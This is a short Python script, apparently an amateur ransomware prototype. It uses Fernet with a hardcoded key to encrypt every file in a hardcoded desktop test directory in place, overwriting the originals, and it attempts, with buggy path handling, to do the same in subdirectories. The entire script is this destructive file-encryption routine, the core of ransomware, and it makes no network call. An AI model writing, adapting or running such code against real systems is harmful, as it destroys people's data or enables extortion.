from cryptography.fernet import Fernet
import os

# key = Fernet.generate_key()
# print(key)

os.chdir('C:/Users/zaidf/OneDrive/Desktop/test-dir2')

directory = 'C:/Users/zaidf/OneDrive/Desktop/test-dir2'
list_dir = os.listdir()


def function_over_files(path):
    key = b'i-r4XgEEXOYPHA5xNpq_uZnZfcFYiHAb59KH66IdkhU='
    for file in os.listdir(path):
        if os.path.isfile(file):
            print(file)
            file_in_dir = open(file, 'rb')
            data = file_in_dir.read()
            file_in_dir.close()
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            encrypted_file = open(file, 'wb')
            encrypted_file.write(encrypted)

        elif os.path.isdir(path):
            new_path = os.path.join(f'{path}/', file)
            print(new_path)
            for sub_dir_file in os.listdir(new_path):
                print(sub_dir_file)
                if os.path.isfile(sub_dir_file):
                    file_in_dir = open(sub_dir_file, 'rb')
                    data = file_in_dir.read()
                    file_in_dir.close()
                    fernet = Fernet(key)
                    encrypted = fernet.encrypt(data)
                    encrypted_file = open(sub_dir_file, 'wb')
                    encrypted_file.write(encrypted)


function_over_files(directory)
